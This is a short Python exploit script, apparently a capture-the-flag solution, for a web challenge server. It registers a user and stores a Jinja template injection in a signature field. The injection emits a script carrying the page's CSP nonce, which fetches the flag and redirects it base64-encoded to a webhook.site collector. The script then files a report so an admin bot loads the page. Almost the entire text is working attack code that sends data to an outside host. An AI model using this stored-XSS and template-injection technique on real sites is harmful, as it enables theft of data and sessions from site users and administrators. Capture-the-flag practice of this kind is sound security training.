import requests
import random
import string

TARGET = "http://tasks.4x10m.ru:20638"
WEBHOOK_URL = "https://webhook.site/e317942f-ae7e-4617-8133-09c917d906bc"

def solve():
    s = requests.Session()
    u = ''.join(random.choices(string.ascii_lowercase, k=8))
    
    print(f"[*] Register & Login: {u}")
    s.post(f"{TARGET}/register", data={"username": u, "password": u})
    s.post(f"{TARGET}/login", data={"username": u, "password": u})
    
    print("[*] Injecting Final XSS Payload...")
    # Kita murni pakai JS 'location.pathname' untuk menghindari error tipe data Jinja
    payload = f'{{{{ markup(\'<script nonce="\' ~ nonce ~ \'">fetch(location.pathname+"/flag").then(r=>r.text()).then(t=>{{window.location.href="{WEBHOOK_URL}/?flag="+btoa(t)}})</script>\') }}}}'
    s.post(f"{TARGET}/dashboard", data={"signature_template": payload})
    
    print("[*] Triggering admin bot...")
    s.post(f"{TARGET}/reports/new", data={"username": u, "reason": "Tolong cek."})
    
    print("[+] Selesai! Coba tunggu 5 detik dan cek webhook.")

if __name__ == "__main__":
    solve()
